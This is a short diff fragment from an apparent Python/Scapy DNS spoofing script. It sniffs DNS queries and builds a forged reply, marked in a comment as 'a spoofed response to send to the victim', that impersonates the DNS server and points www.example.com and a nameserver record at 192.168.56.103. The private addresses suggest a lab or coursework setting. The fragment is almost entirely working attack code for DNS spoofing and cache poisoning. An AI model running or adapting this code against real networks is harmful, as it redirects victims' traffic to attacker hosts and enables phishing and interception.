@@ -27,6 +27,7 @@ while 1:
 				 
 		print ("Received query with src %s and dest %s and query id %s for %s \n"%(src_ip,dns_server,query_id, query_name))
 	 	
+	 	#generating a spoofed response to send to the victim	
 		dns_spoof_resp = IP(src = dns_server,dst = src_ip)\
 			/UDP(dport = src_port, sport = 53)\
 			/DNS(id = query_id, qr=1, rd=0, ra=0, z=0,rcode=0, qdcount = qdata_count,ancount = 1, nscount=1, arcount=0,qd=DNSQR(qname='www.example.com',qtype=dns_pack[0].getlayer(DNS).qd.qtype,qclass=dns_pack[0].getlayer(DNS).qd.qclass),an=DNSRR(rrname='www.example.com',rdata='192.168.56.103',ttl=86400),ns=DNSRR(rrname='ns.example.com',type=2,ttl=86400,rdata='192.168.56.103'),ar=DNSRR(rrname='www.example.com',rdata='192.168.56.103'))
